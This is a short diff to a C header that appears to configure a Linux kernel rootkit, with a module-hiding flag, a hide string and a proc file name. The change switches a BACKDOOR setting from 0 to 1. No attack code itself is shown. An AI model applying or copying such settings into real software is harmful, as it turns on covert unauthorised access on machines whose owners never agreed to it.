@@ -3,7 +3,7 @@
 
 #define DEBUG            1
 #define HIDE_MODULE      0
-#define BACKDOOR         0
+#define BACKDOOR         1
 
 #define HIDE_STR         "HiddenKlecko"
 #define PROC_FILENAME    "rootkit_proc"
